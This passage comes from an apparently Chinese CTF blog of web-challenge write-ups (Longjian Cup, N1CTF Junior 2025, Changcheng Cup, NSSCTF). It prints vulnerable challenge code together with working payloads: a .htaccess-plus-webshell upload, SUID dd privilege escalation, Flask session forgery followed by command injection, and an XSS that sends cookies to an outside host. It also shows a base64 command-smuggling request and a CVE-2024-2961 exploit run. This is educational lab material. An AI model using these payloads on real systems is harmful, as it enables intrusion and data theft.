\u0026#34;/var/www/html/uploads/$session_id/\u0026#34;; $target_file_path = $target_dir . $target_file; $uploadOk = 1; $lastDotPosition = strrpos($target_file, \u0026#39;.\u0026#39;); if (file_exists($target_file_path)) { echo \u0026#34;Sorry, file already exists.\\n\u0026#34;; $uploadOk = 0; } if ($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;size\u0026#34;] \u0026gt; 50000) { echo \u0026#34;Sorry, your file is too large.\\n\u0026#34;; $uploadOk = 0; } if ($lastDotPosition == false) { $filename = $target_file; $extension = \u0026#39;\u0026#39;; } else { $filename = substr($target_file, 0, $lastDotPosition); $extension = substr($target_file, $lastDotPosition + 1); } if ($extension !== \u0026#39;\u0026#39; \u0026amp;\u0026amp; $extension !== \u0026#39;txt\u0026#39;) { echo \u0026#34;Sorry, only .txt extensions are allowed.\\n\u0026#34;; $uploadOk = 0; } if (!(preg_match(\u0026#39;/^[a-f0-9]{32}$/\u0026#39;, $session_id))) { echo \u0026#34;Sorry, that is not a valid session ID.\\n\u0026#34;; $uploadOk = 0; } if ($uploadOk == 0) { echo \u0026#34;Sorry, your file was not uploaded.\\n\u0026#34;; } else { $temp_file_path = $target_dir . uniqid(\u0026#39;temp_\u0026#39;, true) . \u0026#39;.tmp\u0026#39;; if (move_uploaded_file($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;tmp_name\u0026#34;], $temp_file_path)) { chmod($temp_file_path, 0000); $is_hidden = (substr($target_file, 0, 1) === \u0026#39;.\u0026#39;); if ($is_hidden) { chmod($temp_file_path, 0644); } if (rename($temp_file_path, $target_file_path)) { echo \u0026#34;The file \u0026#34; . htmlspecialchars(basename($_FILES[\u0026#34;fileToUpload\u0026#34;][\u0026#34;name\u0026#34;])) . \u0026#34; has been uploaded.\u0026#34;; if (!$is_hidden) { chmod($target_file_path, 0000); } } else { echo \u0026#34;Sorry, there was an error renaming your file.\u0026#34;; if (file_exists($temp_file_path)) { unlink($temp_file_path); } } } else { echo \u0026#34;Sorry, there was an error uploading your file.\u0026#34;; } $old_path = getcwd(); chdir($target_dir); shell_exec(\u0026#39;chmod 000 *\u0026#39;); chdir($old_path); } } ?\u0026gt; 实现了文件上传的功能，Cookie值$session_id可控，也就是说上传目录是已知的，对于文件名有限制，如果是aaa.bbb的文件名则会对后缀进行校验，bbb必须为空或txt，并且文件如果上传成功是0000的属性，但如果是.xxx则可以绕过后缀校验，并且之后上传文件会被置为0644的属性，于是可以想到通过上传.htaccess实现解析.xxx文件：\n\u0026lt;FilesMatch \u0026#34;.test\u0026#34;\u0026gt; SetHandler application/x-httpd-php \u0026lt;/FilesMatch\u0026gt; 把一句话木马写进.test文件，先上传.htaccess，再上传.test就能蚁剑连接，/tmp目录下有个假flag，根目录下的flag只有root可读，需要进行提权，尝试先查找具有suid权限的文件：\nfind / -perm -u=s -type f 2\u0026gt;/dev/null 找到一个dd命令，可以复制flag文件：\ndd if=/flag of=/tmp/flag 最后读取/tmp/flag就能获取flag\n","permalink":"https://blog.w8nn9z.top/posts/ctf/ljb-3th-web-writeup/","summary":"","title":"第三届陇剑杯 总决赛 WEB Writeup"},{"content":"online_unzipper app.py：\nimport os import uuid from flask import Flask, request, redirect, url_for,send_file,render_template, session, send_from_directory, abort, Response app = Flask(__name__) app.secret_key = os.environ.get(\u0026#34;FLASK_SECRET_KEY\u0026#34;, \u0026#34;test_key\u0026#34;) UPLOAD_FOLDER = os.path.join(os.getcwd(), \u0026#34;uploads\u0026#34;) os.makedirs(UPLOAD_FOLDER, exist_ok=True) users = {} @app.route(\u0026#34;/\u0026#34;) def index(): if \u0026#34;username\u0026#34; not in session: return redirect(url_for(\u0026#34;login\u0026#34;)) return redirect(url_for(\u0026#34;upload\u0026#34;)) @app.route(\u0026#34;/register\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def register(): if request.method == \u0026#34;POST\u0026#34;: username = request.form[\u0026#34;username\u0026#34;] password = request.form[\u0026#34;password\u0026#34;] if username in users: return \u0026#34;用户名已存在\u0026#34; users[username] = {\u0026#34;password\u0026#34;: password, \u0026#34;role\u0026#34;: \u0026#34;user\u0026#34;} return redirect(url_for(\u0026#34;login\u0026#34;)) return render_template(\u0026#34;register.html\u0026#34;) @app.route(\u0026#34;/login\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def login(): if request.method == \u0026#34;POST\u0026#34;: username = request.form[\u0026#34;username\u0026#34;] password = request.form[\u0026#34;password\u0026#34;] if username in users and users[username][\u0026#34;password\u0026#34;] == password: session[\u0026#34;username\u0026#34;] = username session[\u0026#34;role\u0026#34;] = users[username][\u0026#34;role\u0026#34;] return redirect(url_for(\u0026#34;upload\u0026#34;)) else: return \u0026#34;用户名或密码错误\u0026#34; return render_template(\u0026#34;login.html\u0026#34;) @app.route(\u0026#34;/logout\u0026#34;) def logout(): session.clear() return redirect(url_for(\u0026#34;login\u0026#34;)) @app.route(\u0026#34;/upload\u0026#34;, methods=[\u0026#34;GET\u0026#34;, \u0026#34;POST\u0026#34;]) def upload(): if \u0026#34;username\u0026#34; not in session: return redirect(url_for(\u0026#34;login\u0026#34;)) if request.method == \u0026#34;POST\u0026#34;: file = request.files[\u0026#34;file\u0026#34;] if not file: return \u0026#34;未选择文件\u0026#34; role = session[\u0026#34;role\u0026#34;] if role == \u0026#34;admin\u0026#34;: dirname = request.form.get(\u0026#34;dirname\u0026#34;) or str(uuid.uuid4()) else: dirname = str(uuid.uuid4()) target_dir = os.path.join(UPLOAD_FOLDER, dirname) os.makedirs(target_dir, exist_ok=True) zip_path = os.path.join(target_dir, \u0026#34;upload.zip\u0026#34;) file.save(zip_path) try: os.system(f\u0026#34;unzip -o {zip_path} -d {target_dir}\u0026#34;) except: return \u0026#34;解压失败，请检查文件格式\u0026#34; os.remove(zip_path) return f\u0026#34;解压完成！\u0026lt;br\u0026gt;下载地址: \u0026lt;a href=\u0026#39;{url_for(\u0026#39;download\u0026#39;, folder=dirname)}\u0026#39;\u0026gt;{request.host_url}download/{dirname}\u0026lt;/a\u0026gt;\u0026#34; return render_template(\u0026#34;upload.html\u0026#34;) @app.route(\u0026#34;/download/\u0026lt;folder\u0026gt;\u0026#34;) def download(folder): target_dir = os.path.join(UPLOAD_FOLDER, folder) if not os.path.exists(target_dir): abort(404) files = os.listdir(target_dir) return render_template(\u0026#34;download.html\u0026#34;, folder=folder, files=files) @app.route(\u0026#34;/download/\u0026lt;folder\u0026gt;/\u0026lt;filename\u0026gt;\u0026#34;) def download_file(folder, filename): file_path = os.path.join(UPLOAD_FOLDER, folder ,filename) try: with open(file_path, \u0026#39;r\u0026#39;) as file: content = file.read() return Response( content, mimetype=\u0026#34;application/octet-stream\u0026#34;, headers={ \u0026#34;Content-Disposition\u0026#34;: f\u0026#34;attachment; filename={filename}\u0026#34; } ) except FileNotFoundError: return \u0026#34;File not found\u0026#34;, 404 except Exception as e: return f\u0026#34;Error: {str(e)}\u0026#34;, 500 if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#34;0.0.0.0\u0026#34;) 注意到role为admin时，dirname可控，可以实现命令拼接rce，伪造flask-session需要先获取app.secret_key，本题是从环境变量导入的，可以利用软链接获取/proc/self/environ的内容：\nFLASK_SECRET_KEY=#mu0cw9F#7bBCoF! 伪造session：\npython flask_session_cookie_manager3.py encode -s \u0026#34;#mu0cw9F#7bBCoF!\u0026#34; -t \u0026#34;{\u0026#39;role\u0026#39;:\u0026#39;admin\u0026#39;,\u0026#39;username\u0026#39;:\u0026#39;test\u0026#39;}\u0026#34;\rsession=eyJyb2xlIjoiYWRtaW4iLCJ1c2VybmFtZSI6InRlc3QifQ.aMUi5w.3kOIwdwel1L_sAQZ2loEgjfRIUA dirname可控实现rce：\ndirname=1;cat /flag*.txt \u0026gt; /app/uploads/c048ac00-3ec7-4557-b328-00e50c5ec392/flag.txt Unfinished app.py：\nfrom flask import Flask, request, render_template, redirect, url_for, flash, render_template_string, make_response from flask_login import LoginManager, UserMixin, login_user, logout_user, current_user, login_required import requests from markupsafe import escape from playwright.sync_api import sync_playwright import os app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = \u0026#39;your-secret-key-here\u0026#39; login_manager = LoginManager() login_manager.init_app(app) login_manager.login_view = \u0026#39;login\u0026#39; class User(UserMixin): def __init__(self, id, username, password, bio=\u0026#34;\u0026#34;): self.id = id self.username = username self.password = password self.bio = bio admin_password = os.urandom(12).hex() USERS_DB = {\u0026#39;admin\u0026#39;: User(id=1, username=\u0026#39;admin\u0026#39;, password=admin_password)} USER_ID_COUNTER = 1 @login_manager.user_loader def load_user(user_id): for user in USERS_DB.values(): if str(user.id) == user_id: return user return None @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): global USER_ID_COUNTER if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] if username in USERS_DB: flash(\u0026#39;Username already exists.\u0026#39;) return redirect(url_for(\u0026#39;register\u0026#39;)) USER_ID_COUNTER += 1 new_user = User( id=USER_ID_COUNTER, username=username, password=request.form[\u0026#39;password\u0026#39;] ) USERS_DB[username] = new_user login_user(new_user) response = make_response(redirect(url_for(\u0026#39;index\u0026#39;))) response.set_cookie(\u0026#39;ticket\u0026#39;, \u0026#39;your_ticket_value\u0026#39;) return response return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] user = USERS_DB.get(username) if user and user.password == password: login_user(user) return redirect(url_for(\u0026#39;index\u0026#39;)) flash(\u0026#39;Invalid credentials.\u0026#39;) return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/logout\u0026#39;) @login_required def logout(): logout_user() return redirect(url_for(\u0026#39;index\u0026#39;)) @app.route(\u0026#39;/profile\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) @login_required def profile(): if request.method == \u0026#39;POST\u0026#39;: current_user.bio = request.form[\u0026#39;bio\u0026#39;] print(current_user.bio) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;profile.html\u0026#39;) @app.route(\u0026#39;/ticket\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def ticket(): if request.method == \u0026#39;POST\u0026#39;: ticket = request.form[\u0026#39;ticket\u0026#39;] response = make_response(redirect(url_for(\u0026#39;index\u0026#39;))) response.set_cookie(\u0026#39;ticket\u0026#39;, ticket) return response return render_template(\u0026#39;ticket.html\u0026#39;) @app.route(\u0026#34;/view\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) @login_required def view_user(): \u0026#34;\u0026#34;\u0026#34; # I found a bug in it. # Until I fix it, I\u0026#39;ve banned /api/bio/. Have fun :) \u0026#34;\u0026#34;\u0026#34; username = request.args.get(\u0026#34;username\u0026#34;,default=current_user.username) visit_url(f\u0026#34;http://localhost/api/bio/{username}\u0026#34;) template = f\u0026#34;\u0026#34;\u0026#34; {{\\% extends \u0026#34;base.html\u0026#34; \\%}} {{\\% block title \\%}}success{{\\% endblock \\%}} {{\\% block content \\%}} \u0026lt;h1\u0026gt;bot will visit your bio\u0026lt;/h1\u0026gt; \u0026lt;p style=\u0026#34;margin-top: 1.5rem;\u0026#34;\u0026gt;\u0026lt;a href=\u0026#34;{{ url_for(\u0026#39;index\u0026#39;) }}\u0026#34;\u0026gt;Back to Home\u0026lt;/a\u0026gt;\u0026lt;/p\u0026gt; {{\\% endblock \\%}} \u0026#34;\u0026#34;\u0026#34; return render_template_string(template) @app.route(\u0026#34;/api/bio/\u0026lt;string:username\u0026gt;\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) @login_required def get_user_bio(username): if not current_user.username == username: return \u0026#34;Unauthorized\u0026#34;, 401 user = USERS_DB.get(username) if not user: return \u0026#34;User not found.\u0026#34;, 404 return user.bio def visit_url(url): try: flag_value = os.environ.get(\u0026#39;FLAG\u0026#39;, \u0026#39;flag{fake}\u0026#39;) with sync_playwright() as p: browser = p.chromium.launch(headless=True, args=[\u0026#34;--no-sandbox\u0026#34;]) context = browser.new_context() context.add_cookies([{ \u0026#39;name\u0026#39;: \u0026#39;flag\u0026#39;, \u0026#39;value\u0026#39;: flag_value, \u0026#39;domain\u0026#39;: \u0026#39;localhost\u0026#39;, \u0026#39;path\u0026#39;: \u0026#39;/\u0026#39;, \u0026#39;httponly\u0026#39;: True }]) page = context.new_page() page.goto(\u0026#34;http://localhost/login\u0026#34;, timeout=5000) page.fill(\u0026#34;input[name=\u0026#39;username\u0026#39;]\u0026#34;, \u0026#34;admin\u0026#34;) page.fill(\u0026#34;input[name=\u0026#39;password\u0026#39;]\u0026#34;, admin_password) page.click(\u0026#34;input[name=\u0026#39;submit\u0026#39;]\u0026#34;) page.wait_for_timeout(3000) page.goto(url, timeout=5000) page.wait_for_timeout(5000) browser.close() except Exception as e: print(f\u0026#34;Bot error: {str(e)}\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 实现了一个常规的注册登录修改个人信息的功能，个人信息中可以修改两条内容，一个是ticket，另一个是bio，同时提供了bot访问指定用户bio的功能，第一时间想到XSS带出Cookie，将bio改为XSS语句：\n\u0026lt;script\u0026gt;fetch(\u0026#39;http://ip:port/steal?flag=\u0026#39;+document.cookie)\u0026lt;/script\u0026gt; 想要实现XSS还需要解决两个问题，第一个问题/api/bio/\u0026lt;string:username\u0026gt;路由要求只能自己访问自己的bio，第二个问题bot设置Cookie的httpOnly属性为True，正常情况下是无法通过javascript脚本来获取Cookie的\nnginx.conf：\nuser www-data;\rworker_processes auto;\rpid /var/run/nginx.pid;\revents {\rworker_connections 1024;\r}\rhttp {\rproxy_cache_path /var/cache/nginx levels=1:2 keys_zone=static_cache:10m max_size=1g inactive=60m;\rinclude /etc/nginx/mime.types;\rdefault_type application/octet-stream;\rserver {\rlisten 80 default_server;\rserver_name _;\rlocation / {\rproxy_pass http://127.0.0.1:5000;\r}\rlocation /api/bio/ {\rreturn 403;\r}\rlocation ~ \\.(css|js)$ {\rproxy_pass http://127.0.0.1:5000;\rproxy_ignore_headers Vary;\rproxy_cache static_cache;\rproxy_cache_valid 200 10m;\r}\r}\r} 对于第一个问题，在nginx.conf中甚至直接ban了/api/bio/，但是这里有个nginx的配置问题，正则匹配优先级是高于普通前缀匹配的，因此只要设置用户名为.js/.css后缀，这样就能实现访问自己的bio\n要想让bot访问恶意用户的bio，还需要利用到nginx中设置的cache，本题是10min的缓存，并且没有明确设置缓存键proxy_cache_key，使用默认缓存键，例如：\n$scheme：GET\r$proxy_host：example.com\r$request_uri：/index.html 通过缓存投毒来绕过current_user.username == username的判断，这样bot就能访问恶意用户的bio，从而解决第一个问题\n对于第二个问题，app.py中设置的是httponly，但是正确的设置应该是httpOnly，因此并没有起到预防XSS窃取Cookie的作用\n大致的攻击流程：创建.js/.css后缀用户名 -\u0026gt; 设置bio为XSS -\u0026gt; 自己访问恶意bio实现缓存投毒 -\u0026gt; bot访问恶意bio实现XSS窃取Cookie，攻击效果：\n参考资料：\nhttps://www.echo.cool/docs/middleware/nginx/nginx-caching-mechanism/nginx-cache-key/\nhttps://playwright.net.cn/python/docs/api/class-browsercontext\nping app.py：\nimport base64 import subprocess import re import ipaddress import flask def run_ping(ip_base64): try: decoded_ip = base64.b64decode(ip_base64).decode(\u0026#39;utf-8\u0026#39;) if not re.match(r\u0026#39;^\\d+\\.\\d+\\.\\d+\\.\\d+$\u0026#39;, decoded_ip): return False if decoded_ip.count(\u0026#39;.\u0026#39;) != 3: return False if not all(0 \u0026lt;= int(part) \u0026lt; 256 for part in decoded_ip.split(\u0026#39;.\u0026#39;)): return False if not ipaddress.ip_address(decoded_ip): return False if len(decoded_ip) \u0026gt; 15: return False if not re.match(r\u0026#39;^[A-Za-z0-9+/=]+$\u0026#39;, ip_base64): return False except Exception as e: return False command = f\u0026#34;\u0026#34;\u0026#34;echo \u0026#34;ping -c 1 $(echo \u0026#39;{ip_base64}\u0026#39; | base64 -d)\u0026#34; | sh\u0026#34;\u0026#34;\u0026#34; try: process = subprocess.run( command, shell=True, check=True, capture_output=True, text=True ) return process.stdout except Exception as e: return False app = flask.Flask(__name__) @app.route(\u0026#39;/ping\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def ping(): data = flask.request.json ip_base64 = data.get(\u0026#39;ip_base64\u0026#39;) if not ip_base64: return flask.jsonify({\u0026#39;error\u0026#39;: \u0026#39;no ip\u0026#39;}), 400 result = run_ping(ip_base64) if result: return flask.jsonify({\u0026#39;success\u0026#39;: True, \u0026#39;output\u0026#39;: result}), 200 else: return flask.jsonify({\u0026#39;success\u0026#39;: False}), 400 @app.route(\u0026#39;/\u0026#39;) def index(): return flask.render_template(\u0026#39;index.html\u0026#39;) app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 实现了ping ip的功能，同时对于python base64解码后的ip有严格的过滤，但是在执行命令时用的是linux的base64实现的解码，二者的实现是有差异的，python不会解析填充符=之后的内容：\nimport base64 s1 = b\u0026#34;dGVzdA==\u0026#34; s2 = b\u0026#34;dGVzdA==Y29tbWFuZA==\u0026#34; print(base64.b64decode(s1)) # b\u0026#39;test\u0026#39; print(base64.b64decode(s2)) # b\u0026#39;test\u0026#39; $ echo \u0026#39;dGVzdA==\u0026#39; | base64 -d test $ echo \u0026#39;dGVzdA==Y29tbWFuZA==\u0026#39; | base64 -d testcommand 只需要构造一个base64编码后有填充符的ip，后面跟上base64编码的命令就能实现rce：\n$ echo -n \u0026#39;8.8.8.8\u0026#39; | base64 | tr -d \u0026#39;\\n\u0026#39;; echo -n \u0026#39;;cat /flag\u0026#39; | base64 OC44LjguOA==O2NhdCAvZmxhZw== payload：\n{\u0026#34;ip_base64\u0026#34;:\u0026#34;OC44LjguOA==O2NhdCAvZmxhZw==\u0026#34;} response：\n{\u0026#34;output\u0026#34;:\u0026#34;PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.\\n64 bytes from 8.8.8.8: icmp_seq=1 ttl=128 time=66.5 ms\\n\\n--- 8.8.8.8 ping statistics ---\\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\\nrtt min/avg/max/mdev = 66.546/66.546/66.546/0.000 ms\\nflag{test}\\n\u0026#34;,\u0026#34;success\u0026#34;:true} ","permalink":"https://blog.w8nn9z.top/posts/ctf/n1ctf-junior-2025-22-web-writeup/","summary":"","title":"N1CTF Junior 2025 2/2 WEB Writeup"},{"content":"文曲签学 长按Fn进入调试模式：\n\u0026gt; #read HINT\r文件内容：\r关注微信公众号“春秋伽玛”回复“文曲旧时光”可获得提示。 提示：\rflag在/flag下，可以尝试目录穿越漏洞来读取它。\r会过滤“../”，可以使用双写来绕过。\r文件名有大小写区分。 \u0026gt; #read ....//....//....//....//flag\r文件内容：\rHere is my flag for you:\rflag{f08823a3-7151-4372-8705-7d1e96ce7f0a}\rWhen I learn it well, I will pass on this persistence to you too. EZ_upload index.php：\n\u0026lt;?php highlight_file(__FILE__); function handleFileUpload($file) { $uploadDirectory = \u0026#39;/tmp/\u0026#39;; if ($file[\u0026#39;error\u0026#39;] !== UPLOAD_ERR_OK) { echo \u0026#39;文件上传失败。\u0026#39;; return; } $filename = basename($file[\u0026#39;name\u0026#39;]); $filename = preg_replace(\u0026#39;/[^a-zA-Z0-9_\\-\\.]/\u0026#39;, \u0026#39;_\u0026#39;, $filename); if (empty($filename)) { echo \u0026#39;文件名不符合要求。\u0026#39;; return; } $destination = $uploadDirectory . $filename; if (move_uploaded_file($file[\u0026#39;tmp_name\u0026#39;], $destination)) { exec(\u0026#39;cd /tmp \u0026amp;\u0026amp; tar -xvf \u0026#39; . $filename.\u0026#39;\u0026amp;\u0026amp;pwd\u0026#39;); echo $destination; } else { echo \u0026#39;文件移动失败。\u0026#39;; } } handleFileUpload($_FILES[\u0026#39;file\u0026#39;]); ?\u0026gt; tar的软链接利用，和zip差不多：\n$ ln -s /var/www/html link $ tar -cvf link1.tar link link $ tar -cvf link2.tar link/shell.php link/shell.php 先后上传link1.tar和link2.tar，蚁剑连上shell.php找到flag位置/flllllll1111ag：flag{4d24f1f7-0aeb-42a9-8e89-480e072832bc}\nSeRce index.php：\n\u0026lt;?php highlight_file(__FILE__); $exp = $_GET[\u0026#34;exp\u0026#34;]; if(isset($exp)){ if(serialize(unserialize($exp)) != $exp){ $data = file_get_contents($_POST[\u0026#39;filetoread\u0026#39;]); echo \u0026#34;File Contents: $data\u0026#34;; } } 利用不完整类__PHP_Incomplete_Class_Name来绕过：\n\u0026lt;?php $raw = \u0026#39;O:1:\u0026#34;A\u0026#34;:2:{s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;b\u0026#34;;s:27:\u0026#34;__PHP_Incomplete_Class_Name\u0026#34;;s:1:\u0026#34;F\u0026#34;;}\u0026#39;; $exp = \u0026#39;O:1:\u0026#34;F\u0026#34;:1:{s:1:\u0026#34;a\u0026#34;;s:1:\u0026#34;b\u0026#34;;}\u0026#39;; var_dump(serialize(unserialize($raw)) == $exp); // true 后续打CVE-2024-2961，用现有的cnext-exploit.py改一下参数就行：\ndef send(self, path: str) -\u0026gt; Response: \u0026#34;\u0026#34;\u0026#34;Sends given `path` to the HTTP server. Returns the response. \u0026#34;\u0026#34;\u0026#34; return self.session.post(self.url, data={\u0026#34;filetoread\u0026#34;: path}) def download(self, path: str) -\u0026gt; bytes: \u0026#34;\u0026#34;\u0026#34;Returns the contents of a remote file. \u0026#34;\u0026#34;\u0026#34; path = f\u0026#34;php://filter/convert.base64-encode/resource={path}\u0026#34; response = self.send(path) data = response.re.search(b\u0026#34;File Contents: (.*)\u0026#34;, flags=re.S).group(1) return base64.decode(data) $ python cnext-exploit.py https://eci-2zedrk0au8es9rxxsm0a.cloudeci1.ichunqiu.com/?exp=O%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A1%3A%22b%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A1%3A%22F%22%3B%7D \u0026#39;/readflag \u0026gt; /tmp/flag\u0026#39; [*] The data:// wrapper works [*] The php://filter/ wrapper works [*] The zlib extension is enabled [+] Exploit preconditions are satisfied [*] Using 0x7f65b7a00040 as heap EXPLOIT SUCCESS 读/tmp/flag文件：\n参考资料：\nhttps://www.cnblogs.com/kengwang/p/17842320.html\n","permalink":"https://blog.w8nn9z.top/posts/ctf/ccb-2025-web-writeup/","summary":"","title":"第五届长城杯 WEB Writeup"},{"content":"ez_signin 题目给了附件，app.py：\nfrom flask import Flask, request, render_template, jsonify from pymongo import MongoClient import re app = Flask(__name__) client = MongoClient(\u0026#34;mongodb://localhost:27017/\u0026#34;) db = client[\u0026#39;aggie_bookstore\u0026#39;] books_collection = db[\u0026#39;books\u0026#39;] def sanitize(input_str: str) -\u0026gt; str: return re.sub(r\u0026#39;[^a-zA-Z0-9\\s]\u0026#39;, \u0026#39;\u0026#39;, input_str) @app.route(\u0026#39;/\u0026#39;) def index(): return render_template(\u0026#39;index.html\u0026#39;, books=None) @app.route(\u0026#39;/search\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def search(): query = {\u0026#34;$and\u0026#34;: []} books = [] if request.method == \u0026#39;GET\u0026#39;: title = request.args.get(\u0026#39;title\u0026#39;, \u0026#39;\u0026#39;).strip() author = request.args.get(\u0026#39;author\u0026#39;, \u0026#39;\u0026#39;).strip() title_clean = sanitize(title) author_clean = sanitize(author) if title_clean: query[\u0026#34;$and\u0026#34;].append({\u0026#34;title\u0026#34;: {\u0026#34;$eq\u0026#34;: title_clean}}) if author_clean: query[\u0026#34;$and\u0026#34;].append({\u0026#34;author\u0026#34;: {\u0026#34;$eq\u0026#34;: author_clean}}) if query[\u0026#34;$and\u0026#34;]: books = list(books_collection.find(query)) return render_template(\u0026#39;index.html\u0026#39;, books=books) elif request.method == \u0026#39;POST\u0026#39;: if request.content_type == \u0026#39;application/json\u0026#39;: try: data = request.get_json(force=True) title = data.get(\u0026#34;title\u0026#34;) author = data.get(\u0026#34;author\u0026#34;) if isinstance(title, str): title = sanitize(title) query[\u0026#34;$and\u0026#34;].append({\u0026#34;title\u0026#34;: title}) elif isinstance(title, dict): query[\u0026#34;$and\u0026#34;].append({\u0026#34;title\u0026#34;: title}) if isinstance(author, str): author = sanitize(author) query[\u0026#34;$and\u0026#34;].append({\u0026#34;author\u0026#34;: author}) elif isinstance(author, dict): query[\u0026#34;$and\u0026#34;].append({\u0026#34;author\u0026#34;: author}) if query[\u0026#34;$and\u0026#34;]: books = list(books_collection.find(query)) return jsonify([ {\u0026#34;title\u0026#34;: b.get(\u0026#34;title\u0026#34;), \u0026#34;author\u0026#34;: b.get(\u0026#34;author\u0026#34;), \u0026#34;description\u0026#34;: b.get(\u0026#34;description\u0026#34;)} for b in books ]) return jsonify({\u0026#34;error\u0026#34;: \u0026#34;Empty query\u0026#34;}), 400 except Exception as e: return jsonify({\u0026#34;error\u0026#34;: str(e)}), 500 return jsonify({\u0026#34;error\u0026#34;: \u0026#34;Unsupported Content-Type\u0026#34;}), 400 if __name__ == \u0026#34;__main__\u0026#34;: app.run(\u0026#34;0.0.0.0\u0026#34;, 8000) flask+mongodb实现了一个BookStore根据title和author查询book的功能，如果是GET方式请求或是POST方式传参string，参数会被sanitize方法过滤，只允许大小写字母数字空格，无法实现NoSQL注入\n但如果是POST方式请求，传参格式为json，就不会进行任何过滤，且NoSQL注入刚好需要传入dict类型数据：\nEzCRC index.php：\n\u0026lt;?php error_reporting(0); ini_set(\u0026#39;display_errors\u0026#39;, 0); highlight_file(__FILE__); function compute_crc16($data) { $checksum = 0xFFFF; for ($i = 0; $i \u0026lt; strlen($data); $i++) { $checksum ^= ord($data[$i]); for ($j = 0; $j \u0026lt; 8; $j++) { if ($checksum \u0026amp; 1) { $checksum = (($checksum \u0026gt;\u0026gt; 1) ^ 0xA001); } else { $checksum \u0026gt;\u0026gt;= 1; } } } return $checksum; } function calculate_crc8($input) { static $crc8_table = [ 0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15, 0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D, 0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65, 0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D, 0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5, 0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD, 0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85, 0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD, 0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2, 0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA, 0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2, 0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A, 0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32, 0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A, 0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42, 0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A, 0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C, 0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4, 0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC, 0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4, 0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C, 0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44, 0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C, 0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34, 0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B, 0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63, 0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B, 0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13, 0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB, 0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83, 0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB, 0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3 ]; $bytes = unpack(\u0026#39;C*\u0026#39;, $input); $length = count($bytes); $crc = 0; for ($k = 1; $k \u0026lt;= $length; $k++) { $crc = $crc8_table[($crc ^ $bytes[$k]) \u0026amp; 0xff]; } return $crc \u0026amp; 0xff; } $SECRET_PASS = \u0026#34;Enj0yNSSCTF4th!\u0026#34;; include \u0026#34;flag.php\u0026#34;; if 